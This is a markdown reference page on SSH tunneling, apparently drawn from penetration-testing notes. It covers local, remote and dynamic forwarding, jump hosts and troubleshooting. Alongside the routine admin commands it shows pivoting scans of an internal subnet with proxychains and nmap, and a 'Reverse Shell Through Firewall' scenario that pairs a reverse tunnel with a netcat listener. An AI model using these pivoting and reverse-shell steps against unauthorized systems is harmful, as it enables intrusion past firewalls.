# SSH Tunneling

Port forwarding and tunneling techniques using SSH.

## Types of Tunnels

| Type | Direction | Use Case |
|:-----|:----------|:---------|
| **Local** | Remote → Local | Access remote service locally |
| **Remote** | Local → Remote | Expose local service to remote |
| **Dynamic** | SOCKS proxy | Proxy traffic through SSH |

---

## Local Port Forwarding

Access a remote service through localhost.

```
[You] ← local tunnel → [SSH Server] → [Target Service]
```

```bash
# Syntax
ssh -L <local_port>:<target>:<target_port> user@ssh_server

# Access remote web server
ssh -L 8080:192.168.1.100:80 user@pivot
# Now access http://localhost:8080

# Access remote database through pivot
ssh -L 3306:db.internal:3306 user@pivot
# Now connect to localhost:3306

# Multiple forwards
ssh -L 8080:192.168.1.100:80 -L 3306:db.internal:3306 user@pivot
```

---

## Remote Port Forwarding

Expose your service to the remote network.

```
[You: Service] → remote tunnel → [SSH Server] → [Remote Clients]
```

```bash
# Syntax
ssh -R <remote_port>:<local_target>:<local_port> user@ssh_server

# Expose local web server
ssh -R 8080:localhost:80 user@remote_server
# Remote can now access your web server via localhost:8080

# Expose to all interfaces (requires GatewayPorts yes in sshd_config)
ssh -R 0.0.0.0:8080:localhost:80 user@remote_server
```

---

## Dynamic Port Forwarding (SOCKS Proxy)

Create a SOCKS proxy for flexible routing.

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@pivot

# Use with proxychains
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 1080

proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://internal.server
```

### Browser Configuration
Configure browser to use SOCKS5 proxy:
- Host: `127.0.0.1`
- Port: `1080`

---

## Useful Options

| Option | Description |
|:-------|:------------|
| `-N` | Don't execute remote command |
| `-f` | Background after authentication |
| `-T` | Disable pseudo-terminal |
| `-q` | Quiet mode |

```bash
# Background tunnel (no shell)
ssh -fNT -L 8080:internal:80 user@pivot

# Kill background tunnel
pkill -f "ssh.*8080"
```

---

## SSH Through Jump Hosts

### ProxyJump (-J)
```bash
# Jump through pivot to reach target
ssh -J user@pivot user@target

# Multiple jumps
ssh -J user@jump1,user@jump2 user@target
```

### SSH Config
```
# ~/.ssh/config
Host target
    HostName 192.168.1.100
    User admin
    ProxyJump pivot

Host pivot
    HostName 10.10.10.1
    User user
```

---

## Practical Scenarios

### Scenario 1: Access Internal Web Server
```bash
# You can SSH to pivot (10.10.10.1)
# Pivot can reach web server (192.168.1.100:80)

ssh -L 8080:192.168.1.100:80 user@10.10.10.1
# Access at http://localhost:8080
```

### Scenario 2: Scan Internal Network
```bash
# Set up dynamic proxy
ssh -D 9050 user@pivot

# Scan through proxy
proxychains nmap -sT -Pn 192.168.1.0/24
```

### Scenario 3: Reverse Shell Through Firewall
```bash
# On target (reverse tunnel back to you)
ssh -R 4444:localhost:4444 user@your_server

# On your server, set up listener
nc -lvnp 4444
```

---

## Troubleshooting

| Issue | Solution |
|:------|:---------|
| "Permission denied" | Check if GatewayPorts enabled for binding 0.0.0.0 |
| Connection refused | Verify target is reachable from SSH server |
| Tunnel not working | Check firewall on all hosts |
| Slow connection | Consider using compression: `ssh -C` |
